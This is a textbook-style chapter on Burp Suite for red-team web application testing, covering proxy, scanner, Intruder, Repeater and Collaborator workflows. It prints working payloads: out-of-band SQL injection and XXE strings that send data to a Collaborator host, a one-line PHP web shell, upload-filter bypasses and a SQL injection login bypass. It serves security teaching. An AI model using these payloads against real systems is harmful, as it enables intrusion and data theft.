# Chapter 3: Web Application Reconnaissance

## Burp Suite: The Web Application Hacker's Swiss Army Knife

![Burp Suite architecture diagram](./images/burp_architecture.png)
*Figure 3.1: Burp Suite's component architecture showing data flow between modules*

### Introduction to Burp Suite

Burp Suite stands as the most comprehensive and widely used web application security testing toolkit available today. Created by PortSwigger, Burp Suite has evolved from a simple proxy into an extensible platform that supports the entire web application security testing process, from initial mapping and analysis to exploitation and reporting.

For red teamers, Burp Suite represents the primary toolkit for web application attacks, allowing the detailed inspection, manipulation, and exploitation of web traffic. This section explores advanced Burp Suite usage strategies, focusing on the Professional edition's capabilities, though many techniques apply to the Community edition as well.

### Core Components Overview

Burp Suite consists of several integrated tools, each with specific functions in the web application testing process:

#### Proxy

The Proxy forms the heart of Burp Suite, intercepting traffic between the browser and target applications.

```
Proxy → Options → Proxy Listeners
Add: Interface = 127.0.0.1:8080
```

**Advanced Proxy Configuration**

```
# Configure invisible proxying
Proxy → Options → Proxy Listeners → Edit → Request Handling → Support invisible proxying

# Configure hostname resolution
Project Options → Connections → Hostname Resolution
Add: example.com = 192.168.1.100
```

**Certificate Management**

```
# Export Burp CA Certificate
Proxy → Options → Proxy Listeners → Import / export CA certificate → Export → Certificate in DER format

# Install in Firefox
Settings → Privacy & Security → Certificates → View Certificates → Authorities → Import
```

**WebSockets Handling**

```
# Intercept WebSocket messages
Proxy → Options → Intercept WebSockets messages
```

**Mobile Application Testing**

```
# Configure mobile device to use Burp Proxy
1. Connect mobile device to same network as Burp
2. Set proxy on device to your computer's IP and port 8080
3. Install Burp CA certificate on device

# Android ADB proxy setup
adb shell settings put global http_proxy 192.168.1.100:8080
```

#### Scanner (Professional Edition)

The Scanner performs automated vulnerability detection across web applications.

```
# Active scanning
1. Send request to scanner: Right-click → Scan → Active Scan
2. Configure scan: Target → Scope → Add URL/host
3. Scanner → Options → Issue types → Select relevant checks
4. Scanner → Dashboard → New Scan → Choose scan type

# Passive scanning
Scanner → Live Scanning → Live Passive Scanning → Enable
```

**Custom Scan Configurations**

```
# Create scan profile for high-speed enumeration
Scanner → Scan Configurations → New → Based on: Fast Scan
Disable: JavaScript analysis, form submission, param enumeration
Enable: Only High and Medium issues

# Create thorough scan profile
Scanner → Scan Configurations → New → Based on: Audit checks
Enable: All checks, crawl strategy depth-first, form submission
```

**Scan Queue Management**

```
# Prioritize scan items
Scanner → Scan Queue → Right-click item → Move to top

# Pause resource-intensive scans
Scanner → Active Scanning → Pause
```

#### Intruder

Intruder automates customized attacks against web applications.

```
# Basic intruder setup
1. Send request to Intruder: Right-click → Send to Intruder
2. Intruder → Positions → Clear § → Auto mark parameters
3. Intruder → Payloads → Payload set → Add payloads
4. Intruder → Options → Configure threads, request engine
5. Start attack
```

**Attack Types**

```
# Sniper - Single insertion point testing
Intruder → Positions → Attack type: Sniper
# Tests each position with each payload, one at a time

# Battering Ram - Same payload in multiple positions
Intruder → Positions → Attack type: Battering ram
# Useful for testing similar parameters simultaneously

# Pitchfork - Coordinated payloads across positions
Intruder → Positions → Attack type: Pitchfork
# Position 1 uses payload list 1, position 2 uses payload list 2, etc.

# Cluster Bomb - All combinations of payloads
Intruder → Positions → Attack type: Cluster bomb
# Tests all possible combinations (Cartesian product) of payloads
```

**Advanced Payload Processing**

```
# Payload processing rules
Intruder → Payloads → Payload Processing → Add
Rule types: Hash, encode, find/replace, prefix/suffix, case modification

# Payload encoding
Intruder → Payloads → Payload Encoding
Encode: URL-encode these characters: <space>;+
```

**Resource Pool Management**

```
# Create dedicated resource pool for critical attacks
Project options → Resource pools → Add → Maximum concurrent requests: 5

# Assign attack to resource pool
Intruder → Options → Resource pool: Critical_Attacks
```

![Burp Intruder attack workflow](./images/burp_intruder_workflow.png)
*Figure 3.2: Burp Intruder attack workflow showing processing pipeline*

#### Repeater

Repeater allows manual manipulation and resending of individual requests.

```
# Send to repeater
Proxy → History → Right-click request → Send to Repeater

# Repeater optimization
Repeater → Request → Change request method, parameters, headers
Repeater → Settings → Follow redirections automatically
```

**Compare Tool Usage**

```
# Compare responses
1. Send request multiple times with different inputs
2. Select multiple request tabs with Ctrl+Click
3. Right-click → Compare site map items
```

**Request Manipulation Techniques**

```
# Content-Type manipulation
Content-Type: application/x-www-form-urlencoded
↓
Content-Type: application/json
{"parameter":"value"}

# HTTP Method switching
GET /api/users HTTP/1.1
↓
POST /api/users HTTP/1.1

# Protocol downgrading
HTTP/1.1
↓
HTTP/1.0
```

#### Decoder

Decoder handles encoding and decoding of data.

```
# Common encoding/decoding operations
Decoder → Input: payload → Encode as... → URL
Decoder → Input: payload → Decode as... → Base64

# Chained encoding/decoding
Decoder → Input: payload
1. Encode as... → URL
2. Encode as... → Base64
3. Encode as... → HTML
```

**Advanced Encode/Decode Techniques**

```
# Custom encoding alphabet
Decoder → Input: payload → Encode as... → Base64
Encoder options: Custom alphabet: A-Za-z0-9+/

# Hash functions
Decoder → Input: payload → Hash → SHA-256

# Smart decode
Decoder → Input: %3Cscript%3Ealert(1)%3C/script%3E → Smart decode
```

#### Comparer

Comparer enables detailed comparison between responses.

```
# Compare responses to identify differences
1. Send similar requests with different inputs
2. Right-click each response → Send to Comparer
3. Comparer → Select both items → Compare
```

**Visualization Options**

```
# Word-based comparison
Comparer → Words

# Byte-level comparison
Comparer → Bytes

# Filter noise
Comparer → Options → Ignore whitespace
```

#### Sequencer

Sequencer tests the randomness of tokens and session identifiers.

```
# Analyze session token randomness
1. Capture request with token → Right-click → Send to Sequencer
2. Sequencer → Select token location → Start live capture
3. Collect at least 100 tokens
4. Analyze results
```

**Custom Token Selection**

```
# Select custom token position
Sequencer → Token Location → Custom location → Prefix, Suffix, Max length
```

### Advanced Proxy Techniques

The Proxy module offers sophisticated capabilities beyond basic interception.

#### Match and Replace Rules

Create rules to automatically modify requests or responses:

```
# Automatically modify headers
Proxy → Options → Match and Replace → Add
Type: Request headers
Match: User-Agent: .*
Replace: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

# Insert authentication token in all requests
Proxy → Options → Match and Replace → Add
Type: Request headers
Match: ^(?!Authorization:)
Replace: Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### Request/Response Interception Rules

```
# Only intercept specific URLs
Proxy → Options → Intercept Client Requests
Add: URL matches: .*\.api\.
Add: URL matches: .*admin.*

# Intercept responses based on MIME type
Proxy → Options → Intercept Server Responses
Add: MIME type is: application/json
```

#### Automatic Scope Management

```
# Define target scope
Target → Scope → Use advanced scope control
Add: Host or IP range
Add: File: *.php

# Configure proxy to only intercept in-scope items
Proxy → Options → Intercept Client Requests
Add: AND URL is in target scope

# Configure proxy to only log in-scope items
Proxy → Options → Logging → Log to history only in-scope items
```

### Scanning Strategies

For Professional edition users, the Scanner provides powerful vulnerability detection capabilities.

#### Crawl Optimization

```
# Optimize crawling for large applications
Scanner → Options → Crawl Strategy
Set crawl limit: 10,000 requests
Crawl strategy: Breadth-first (for broad coverage)
Forms submission: Prompt for credentials

# Apply login credentials for authenticated crawling
Scanner → Options → Application Login
Record login sequence → New login → Record a sequence
```

#### Custom Scan Configurations

```
# PCI Compliance scan profile
Scanner → Scan Configurations → New
Based on: All Audit Checks
Select: Only PCI-related issues (SQLi, XSS, CSRF)

# API-focused scan profile
Scanner → Scan Configurations → New
Based on: All Audit Checks
Select: Server-side issues, JSON injection, etc.
Deselect: Client-side issues, DOM-based vulnerabilities
```

#### Scheduled Scanning

```
# Create scheduled task (requires Enterprise)
Scanner → Scheduled Tasks → New Task
Schedule: Daily at 01:00
Scope: Target scope
Scan configuration: Custom scan profile
Notifications: Email on completion
```

### Advanced Intruder Attack Techniques

Intruder can be used for sophisticated attacks beyond basic fuzzing.

#### Custom Payload Generators

```
# Recursive grep payload generator
Intruder → Payloads → Payload Type: Recursive grep
Extract from response: "token" value="([^"]+)"
```

**Username Enumeration Attack**

```
# Set up cluster bomb attack with username/password lists
Intruder → Positions → Attack type: Cluster bomb
Mark username and password parameters

# Configure payload sets
Intruder → Payloads → Payload Set 1: Simple list (usernames)
Intruder → Payloads → Payload Set 2: Simple list (passwords)

# Set up grep matches for success/failure indicators
Intruder → Options → Grep - Match → Add
Match: Invalid username
```

**Session Token Analysis**

```
# Capture and analyze session tokens
1. Login to application
2. Send post-login request to Intruder
3. Intruder → Positions → Clear §
4. Intruder → Payloads → Null payloads → Generate: 100 requests
5. Analyze tokens in responses
```

#### Exploiting Race Conditions

```
# Set up race condition test
1. Identify vulnerable request
2. Send to Intruder
3. Intruder → Positions → Attack type: Pitchfork
4. Intruder → Payloads → Payload Type: Null payloads
5. Intruder → Options → Request Engine → Number of threads: 20
6. Intruder → Options → Request Engine → Number of retries: 0
```

#### Multi-Step Attacks with Macros

```
# Create session handling rule with macro
Project options → Sessions → Session Handling Rules → Add
Scope: Include all URLs
Rule Actions: Add → Run a macro
Record macro: Login sequence

# Apply to Intruder attacks
Rule Actions → Add → Apply to Intruder
```

![Burp macro recording workflow](./images/burp_macro_workflow.png)
*Figure 3.3: Multi-step authentication workflow using Burp macros*

### Collaborator (Professional Edition)

Burp Collaborator provides an external service for detecting out-of-band vulnerabilities.

```
# Configure Collaborator
Project options → Misc → Burp Collaborator Server
Use polling over HTTPS: Enabled

# Manual Collaborator testing
1. Burp → Burp Collaborator client
2. Copy Collaborator payload: xyz.oastify.com
3. Insert in parameters, headers, etc.
4. Poll for interactions
```

**SSRF/XXE Testing with Collaborator**

```
# Test for SSRF
Repeater → Request → URL parameter
Original: file=reports/doc.pdf
Modified: file=http://xyz.oastify.com/test.pdf

# Test for XXE
Repeater → Request → XML content
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://xyz.oastify.com/test">
]>
<root>&xxe;</root>
```

**Blind SQLi with Collaborator**

```
# Oracle SQL injection
Repeater → Request → URL parameter
Original: id=123
Modified: id=123 UNION SELECT UTL_HTTP.REQUEST('http://xyz.oastify.com/'||(SELECT user FROM dual)) FROM dual

# MySQL SQL injection
Repeater → Request → URL parameter
Original: id=123
Modified: id=123 AND LOAD_FILE(CONCAT('\\\\',USER(),'.xyz.oastify.com\\abc'))
```

### Extensions and BApp Store

Burp Suite's functionality can be extended with third-party extensions.

#### Essential Extensions

```
# Installation
Extender → BApp Store → Find extension → Install

# Commonly used extensions:
- Active Scan++
- Autorize
- Bypass WAF
- JWT Toolkit
- Param Miner
- Turbo Intruder
- Upload Scanner
```

**Turbo Intruder Usage**

```python
# Example Turbo Intruder script (Python)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=100,
                          pipeline=True
                          )
    
    for word in open('/path/to/payloads.txt'):
        engine.queue(target.req, word.strip())
        
def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```

**Upload Scanner Configuration**

```
# Configure Upload Scanner extension
1. Extensions → Upload Scanner → Options
2. Configure file types: PHP, JSP, ASP, etc.
3. Define extension blacklist bypasses: .php → .php.jpg
4. Right-click request with file upload → Send to Upload Scanner
```

#### Custom Extension Development

```
# Develop a custom Burp extension (Java)
Extender → Extensions → Add
Extension Type: Java
Select file: CustomExtension.jar

# Develop a Python extension
Extender → Extensions → Add
Extension Type: Python
Select file: custom_extension.py
```

### Advanced Target Analysis

The Target tool provides a comprehensive view of the application structure.

#### Site Map Organization

```
# Filter site map
Target → Site map → Filter → Show only in-scope items
Target → Site map → Filter → Show only parameterized requests

# Analyze site map
1. Target → Site map → Display filter
2. Configure filters: Hide success responses, Show only 4xx/5xx
3. Sort by: MIME type, Status code, Response size
```

**Content Discovery**

```
# Discover hidden content
Target → Site map → Select host → Right-click → Engagement tools → Discover content
Path discovery: Enabled
File discovery: wordlist.txt
```

#### Issues Management

```
# Manage scanner issues
Target → Issues → Filter → Show only High severity
Target → Issues → Select issue → Right-click → Report selected issues

# Create custom issues
Target → Issues → Right-click → Add issue manually
Type: Access Control
Severity: High
Confidence: Certain
Details: [Custom description]
```

### Practical Workflows for Red Team Operations

Let's explore complete workflows for common red team web application scenarios.

#### Authentication Bypass Workflow

```
# Step 1: Analyze the authentication form
1. Proxy → Intercept → Capture login request
2. Analyze parameters, request format, and response

# Step 2: Test for basic vulnerabilities
1. Try admin/admin, admin/password combinations
2. Check for SQL injection: admin' --
3. Test for authentication logic flaws: Remove parameters

# Step 3: Password brute force with Intruder
1. Send login request to Intruder
2. Set attack type: Cluster bomb
3. Mark username and password fields
4. Load username and password lists
5. Configure grep extraction for success/failure indicators
6. Start attack and analyze results

# Step 4: Test for improper session management
1. Create multiple accounts
2. Compare session tokens
3. Test session fixation by reusing session IDs
```

#### API Endpoint Enumeration and Testing

```
# Step 1: Discover API endpoints
1. Browse application normally with Proxy enabled
2. Analyze requests for API patterns (/api/, .json responses)
3. Run content discovery on potential API paths

# Step 2: API parameter discovery
1. Select API endpoint request → Send to Repeater
2. Use Param Miner extension: Right-click → Extensions → Param Miner → Guess parameters
3. Try common API parameters: api_key, access_token, id

# Step 3: Test for IDOR vulnerabilities
1. Create two test accounts
2. Identify user-specific API endpoints (e.g., /api/user/123/profile)
3. In Repeater, modify user ID parameter to access other accounts
4. Verify if access control is broken

# Step 4: Test for injection vulnerabilities
1. Send API endpoint to Scanner for active scanning
2. Use Intruder to test for SQL injection in parameters
3. Test for command injection in file path parameters
```

#### File Upload Exploitation

```
# Step 1: Analyze file upload mechanism
1. Intercept file upload request
2. Identify how the application processes uploads
3. Test allowed file types

# Step 2: Bypass file type restrictions
1. Send upload request to Repeater
2. Try changing Content-Type header
3. Modify file extension: shell.php → shell.php.jpg
4. Use null bytes: shell.php%00.jpg

# Step 3: Prepare malicious file
1. Create minimal PHP shell: <?php system($_GET['cmd']); ?>
2. Try different file encodings and formats
3. Test polyglot files (valid image + PHP code)

# Step 4: Upload and execute
1. Successfully upload malicious file
2. Identify upload directory from response
3. Access uploaded file with command parameter
4. Verify execution: /uploads/shell.php?cmd=id
```

> **CASE STUDY: Web Application Red Team Assessment (2023)**
> 
> During a red team engagement for a financial services client, our team identified a critical vulnerability chain using Burp Suite's integrated workflow.
> 
> Initial reconnaissance with Proxy and Target analysis revealed a legacy admin interface at /admin-portal/ that wasn't linked from the main application. Content discovery with the Discover Content tool identified this endpoint based on naming patterns from other parts of the application.
> 
> The admin interface implemented weak session management, which we analyzed using Sequencer. The session tokens showed poor randomness (effective entropy of only 33 bits) and followed a predictable pattern based on timestamp and user ID.
> 
> Using Intruder with a custom payload generator, we crafted valid session tokens for administrative users. Once authenticated as an administrator, we identified a vulnerable file upload function that accepted ZIP files. Using the Repeater tool to modify the Content-Type header and adding a double extension (.php.zip), we bypassed the upload restrictions.
> 
> The comprehensive approach using multiple Burp Suite tools in conjunction allowed us to progress from discovery to exploitation in under four hours, highlighting the importance of integrated tooling for efficient red team operations.
> 
> *Source: Sanitized red team assessment report, 2023*

### Reporting and Documentation

Burp Suite Professional includes reporting capabilities to document findings.

#### Creating Vulnerability Reports

```
# Generate standard report
1. Target → Issues → Select issues to report
2. Right-click → Report selected issues
3. Choose format: HTML, XML, PDF
4. Configure options: Technical details, Remediation details
```

**Custom Report Templates**

```
# Create custom report template
1. Reporter → Options → Report Templates → New
2. Design template with sections:
   - Executive Summary
   - Vulnerability Details
   - Technical Impact
   - Remediation Steps
3. Save template for future use
```

#### Saving and Restoring Project State

```
# Save project state
1. File → Save project
2. Select location and name
3. Choose: Save all details or Save in-scope items only

# Restore project
1. File → Open project
2. Select .burp project file
```

**Project Configuration Options**

```
# Configure project-wide settings
1. Project options → Connections → Upstream Proxy → Use corporate proxy
2. Project options → Sessions → Cookie Jar → Enabled
3. Project options → Misc → Proxy History → Default max size: 1000 MB
```

### Advanced Burp Suite Configuration

#### Performance Optimization

```
# Memory allocation
Java executable -Xmx2g -XX:MaxPermSize=1g

# In Burp:
User options → Misc → Performance
Memory allocation: Enabled, 2048 MB
```

**Scope Control for Large Applications**

```
# Define precise scope to conserve resources
Target → Scope → Use advanced scope control
Add multiple rules with specific paths and file extensions
```

#### Collaborative Testing Support

```
# Share project with team (Enterprise Edition)
1. File → Save copy of project
2. Save to shared network location
3. Team members open copy

# Enable Burp Collaborator for team
Project options → Misc → Burp Collaborator Server
Use private Collaborator server: [team server address]
```

### Conclusion

Burp Suite represents the most comprehensive web application security testing platform available to red teamers. Its integrated tools provide a complete workflow from initial reconnaissance through vulnerability identification to exploitation and reporting.

This chapter has covered advanced Burp Suite techniques that go beyond basic usage, focusing on:

1. **Sophisticated Proxy Configuration** - Advanced interception and traffic manipulation
2. **Automated Scanning Strategies** - Custom configurations for various application types
3. **Complex Attack Scenarios** - Multi-step attacks using Intruder and macros
4. **Extension Ecosystem** - Leveraging and developing custom functionality
5. **Real-World Testing Workflows** - Complete methodologies for common scenarios

Mastery of Burp Suite provides red team operators with the capabilities needed to thoroughly assess modern web applications, identify security weaknesses, and demonstrate realistic attack paths that help organizations improve their security posture.

### Additional Resources

- [Official Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Burp Suite Extensions Directory](https://portswigger.net/bappstore)
- [Burp Methodology](https://portswigger.net/web-security/learning-path)
- [Web Security Testing Guide (OWASP)](https://owasp.org/www-project-web-security-testing-guide/)
